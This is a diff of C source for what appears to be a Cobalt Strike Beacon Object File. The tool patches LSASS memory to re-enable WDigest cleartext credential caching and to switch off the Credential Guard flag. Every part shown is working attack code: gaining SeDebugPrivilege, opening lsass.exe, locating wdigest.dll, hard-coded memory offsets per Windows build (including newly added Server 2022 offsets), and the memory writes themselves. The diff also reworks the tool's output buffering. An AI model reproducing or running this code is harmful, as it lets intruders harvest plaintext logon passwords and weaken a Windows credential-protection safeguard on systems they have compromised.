@@ -6,6 +6,80 @@
 #include "beacon.h"
 
 
+INT iGarbage = 1;
+LPSTREAM lpStream = (LPSTREAM)1;
+
+HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
+	HRESULT hr = S_OK;
+	va_list argList;
+	WCHAR chBuffer[1024];
+	DWORD dwWritten = 0;
+
+	if (lpStream <= (LPSTREAM)1) {
+		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &lpStream);
+		if (FAILED(hr)) {
+			return hr;
+		}
+	}
+
+	va_start(argList, lpwFormat);
+	MSVCRT$memset(chBuffer, 0, sizeof(chBuffer));
+	if (!MSVCRT$_vsnwprintf_s(chBuffer, _countof(chBuffer), _TRUNCATE, lpwFormat, argList)) {
+		hr = E_FAIL;
+		goto CleanUp;
+	}
+	
+	if (FAILED(hr = lpStream->lpVtbl->Write(lpStream, chBuffer, (ULONG)MSVCRT$wcslen(chBuffer) * sizeof(WCHAR), &dwWritten))) {
+		goto CleanUp;
+	}
+
+CleanUp:
+
+	va_end(argList);
+	
+	return hr;
+}
+
+VOID BeaconOutputStreamW() {
+	STATSTG ssStreamData = { 0 };
+	SIZE_T cbSize = 0;
+	ULONG cbRead = 0;
+	LARGE_INTEGER pos;
+	LPWSTR lpwOutput = NULL;
+
+	if (FAILED(lpStream->lpVtbl->Stat(lpStream, &ssStreamData, STATFLAG_NONAME))) {
+		return;
+	}
+
+	cbSize = ssStreamData.cbSize.LowPart;
+	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
+	if (lpwOutput != NULL) {
+		pos.QuadPart = 0;
+		if (FAILED(lpStream->lpVtbl->Seek(lpStream, pos, STREAM_SEEK_SET, NULL))) {
+			goto CleanUp;
+		}
+
+		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
+			goto CleanUp;
+		}
+
+		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
+	}
+
+CleanUp:
+
+	if (lpStream != NULL) {
+		lpStream->lpVtbl->Release(lpStream);
+		lpStream = NULL;
+	}
+
+	if (lpwOutput != NULL) {
+		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
+	}
+
+	return;
+}
+
 // Open a handle to the LSASS process
 HANDLE GrabLsassHandle(DWORD dwPid) {
 	NTSTATUS status;
@@ -62,9 +136,9 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 	LPVOID pAddrOfUseLogonCredentialGlobalVariable = (PUCHAR)scWdigestMem + logonCredential_offSet;
 	LPVOID pAddrOfIsCredGuardEnabledGlobalVariable = (PUCHAR)scWdigestMem + credGuardEnabled_offset;
 
-	BeaconPrintf(CALLBACK_OUTPUT, "[*] g_fParameter_UseLogonCredential at 0x%p\n", pAddrOfUseLogonCredentialGlobalVariable);
+	BeaconPrintToStreamW(L"[+] g_fParameter_UseLogonCredential at 0x%p\n", pAddrOfUseLogonCredentialGlobalVariable);
 	if (bCredGuardEnabled) {
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] g_IsCredGuardEnabled at 0x%p\n", pAddrOfIsCredGuardEnabledGlobalVariable);
+		BeaconPrintToStreamW(L"[+] g_IsCredGuardEnabled at 0x%p\n", pAddrOfIsCredGuardEnabledGlobalVariable);
 	}
 
 	// Read current value of wdigest!g_fParameter_useLogonCredential
@@ -74,16 +148,16 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 	}
 
 	if (ulCurLogonValue == 1) {
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] UseLogonCredential already enabled\n\n");
+		BeaconPrintToStreamW(L"\n[!] UseLogonCredential already enabled\n\n");
 		return TRUE;
 	}
 	else if (ulCurLogonValue != 0) {
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Unexpected g_fParameter_UseLogonCredential value (possible offset mismatch?)\n\n");
+		BeaconPrintToStreamW(L"[!] Error: Unexpected g_fParameter_UseLogonCredential value (possible offset mismatch?)\n\n");
 		return FALSE;
 	}
 	else {
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Current value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);	
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Toggling g_fParameter_UseLogonCredential to 1 in lsass.exe\n");
+		BeaconPrintToStreamW(L"[+] Current value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);	
+		BeaconPrintToStreamW(L"[+] Toggling g_fParameter_UseLogonCredential to 1 in lsass.exe\n");
 	}
 
 	sResult = WriteToLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulNewLogonValue, sizeof(ULONG));
@@ -93,7 +167,7 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 
 	// Read new value of wdigest!g_fParameter_useLogonCredential
 	ReadFromLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulCurLogonValue, sizeof(ULONG));
-	BeaconPrintf(CALLBACK_OUTPUT, "[*] New value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);
+	BeaconPrintToStreamW(L"[+] New value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);
 
 	if (bCredGuardEnabled && credGuardEnabled_offset != 0) {
 		// Read current value of wdigest!g_IsCredGuardEnabled
@@ -103,16 +177,16 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 		}
 
 		if (ulCurCredGuardValue == 0) {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] IsCredGuardEnabled already disabled\n\n");
+			BeaconPrintToStreamW(L"[+] IsCredGuardEnabled already disabled\n\n");
 			return TRUE;
 		}
 		else if (ulCurCredGuardValue != 1) {
-			BeaconPrintf(CALLBACK_ERROR, "[!] Error: Unexpected g_IsCredGuardEnabled value (possible offset mismatch?)\n\n");
+			BeaconPrintToStreamW(L"[!] Error: Unexpected g_IsCredGuardEnabled value (possible offset mismatch?)\n\n");
 			return FALSE;
 		}
 		else {
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Current value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);	
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Toggling g_IsCredGuardEnabled to 0 in lsass.exe\n");
+			BeaconPrintToStreamW(L"[+] Current value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);	
+			BeaconPrintToStreamW(L"[+] Toggling g_IsCredGuardEnabled to 0 in lsass.exe\n");
 		}
 
 		sResult = WriteToLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulNewCredGuardValue, sizeof(ULONG));
@@ -122,10 +196,10 @@ BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_of
 
 		// Read new value of wdigest!g_IsCredGuardEnabled
 		ReadFromLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulCurCredGuardValue, sizeof(ULONG));
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] New value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);
+		BeaconPrintToStreamW(L"[+] New value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);
 	}
 
-	BeaconPrintf(CALLBACK_OUTPUT, "[*] Done... WDigest credential caching should now be on\n\n");
+	BeaconPrintToStreamW(L"\n[+] Done... WDigest credential caching should now be on\n\n");
 
 	return TRUE;
 }
@@ -264,7 +338,13 @@ BOOL SetDebugPrivilege() {
 	HANDLE hToken = NULL;
 	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
 
-	NTSTATUS status = ZwOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
+	_NtOpenProcessToken NtOpenProcessToken = (_NtOpenProcessToken)
+		GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
+	if (NtOpenProcessToken == NULL) {
+		return FALSE;
+	}
+
+	NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
 	if (status != STATUS_SUCCESS) {
 		return FALSE;
 	}
@@ -324,10 +404,10 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 	// Read UBR value from registry (we don't want to screw up lsass)
 	dwUBR = ReadUBRFromRegistry();
 	if (dwUBR != 0) {
-		BeaconPrintf(CALLBACK_OUTPUT, "Windows version: %ls, OS build number: %u.%u\n", chOSMajorMinor, pPEB->OSBuildNumber, dwUBR);
+		BeaconPrintToStreamW(L"[+] Windows version: %ls, OS build number: %u.%u\n\n", chOSMajorMinor, pPEB->OSBuildNumber, dwUBR);
 	}
 	else {
-		BeaconPrintf(CALLBACK_OUTPUT, "Windows version: %ls, OS build number: %u\n", chOSMajorMinor, pPEB->OSBuildNumber);
+		BeaconPrintToStreamW(L"[+] Windows version: %ls, OS build number: %u\n\n", chOSMajorMinor, pPEB->OSBuildNumber);
 	}
 
 	// Offsets for wdigest!g_fParameter_UseLogonCredential (here you can add offsets for additional OS builds/revisions)
@@ -369,27 +449,31 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		logonCredential_offSet = 0x361b4;
 		credGuardEnabled_offset = 0x35c08;
 	}
+	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 20348 && dwUBR >= 501) { // W2k22
+		logonCredential_offSet = 0x3caa4;
+		credGuardEnabled_offset = 0x3cab0;
+	}
 	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber == 22000 && dwUBR >= 348) { // W11 v21H2
 		logonCredential_offSet = 0x3caa4;
 		credGuardEnabled_offset = 0x3cab0;
 	}
 	else {
-		BeaconPrintf(CALLBACK_ERROR, "[!] OS Version/build/revision not supported\n");
+		BeaconPrintToStreamW(L"[!] OS Version/build/revision not supported\n");
 		return;
 	}
 
-	BeaconPrintf(CALLBACK_OUTPUT, "[*] Enable SeDebugPrivilege\n");
+	BeaconPrintToStreamW(L"[+] Enable SeDebugPrivilege\n");
 	if (!SetDebugPrivilege()) {
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to enable SeDebugPrivilege\n");
+		BeaconPrintToStreamW(L"[!] Error: Failed to enable SeDebugPrivilege\n");
 		return;
 	}
 
 	dwLsassPID = GetLsassPid(L"lsass.exe");
 	if (dwLsassPID != 0) {
-		BeaconPrintf(CALLBACK_OUTPUT, "[*] Lsass PID is: %u\n", dwLsassPID);
+		BeaconPrintToStreamW(L"[+] Lsass PID is: %u\n", dwLsassPID);
 	}
 	else{
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to obtain to lsass PID\n");
+		BeaconPrintToStreamW(L"[!] Error: Failed to obtain to lsass PID\n");
 		return;
 	}
 
@@ -397,24 +481,24 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		dwLsaIsoPID = GetLsassPid(L"lsaiso.exe");
 		if (dwLsaIsoPID != 0) {
 			bCredGuardEnabled = TRUE;
-			BeaconPrintf(CALLBACK_OUTPUT, "[*] Credential Guard enabled, LsaIso PID is: %u\n", dwLsaIsoPID);
+			BeaconPrintToStreamW(L"[+] Credential Guard enabled, LsaIso PID is: %u\n", dwLsaIsoPID);
 		}
 	}
 
 	hLsass = GrabLsassHandle(dwLsassPID);
 	if (hLsass ==  NULL || hLsass == INVALID_HANDLE_VALUE) {
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Could not open handle to lsass process\n");
+		BeaconPrintToStreamW(L"[!] Error: Could not open handle to lsass process\n");
 		goto CleanUp;
 	}
 
 	if(!PSAPI$EnumProcessModules(hLsass, 0, 0, &cbNeeded)){
-        BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to enumerate modules\n");
+        BeaconPrintToStreamW(L"[!] Error: Failed to enumerate modules\n");
 		goto CleanUp;
 	}
 
 	hLsassDll = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbNeeded);
 	if (hLsassDll == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] Error: Failed to allocate modules memory\n");
+        BeaconPrintToStreamW(L"[!] Error: Failed to allocate modules memory\n");
 		goto CleanUp;
 	}
 
@@ -429,24 +513,27 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		}
 	}
 	else {
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: No modules in LSASS :(\n");
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: %d\n", KERNEL32$GetLastError());
+		BeaconPrintToStreamW(L"[!] Error: No modules in LSASS :(\n");
+		BeaconPrintToStreamW(L"[!] Error: %d\n", KERNEL32$GetLastError());
 	}
 
 	// Make sure we have all the DLLs that we require
 	if (wdigest == NULL) {
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Could not find all DLL's in LSASS :(\n");
+		BeaconPrintToStreamW(L"[!] Error: Could not find all DLL's in LSASS :(\n");
 		goto CleanUp;
 	}
 
-	BeaconPrintf(CALLBACK_OUTPUT, "[*] wdigest.dll found at 0x%p\n", wdigest);
+	BeaconPrintToStreamW(L"[+] wdigest.dll found at 0x%p\n\n", wdigest);
 
 	if (!ToggleWDigest(hLsass, wdigest, logonCredential_offSet, bCredGuardEnabled, credGuardEnabled_offset)) {
-		BeaconPrintf(CALLBACK_ERROR, "[!] Error: Could not patch g_fParameter_UseLogonCredential\n");
+		BeaconPrintToStreamW(L"[!] Error: Could not patch g_fParameter_UseLogonCredential\n");
 		goto CleanUp;
 	}
 
 CleanUp:
+
+	//Print final Output
+	BeaconOutputStreamW();
 
 	if (hLsass != NULL) {
 		ZwClose(hLsass);
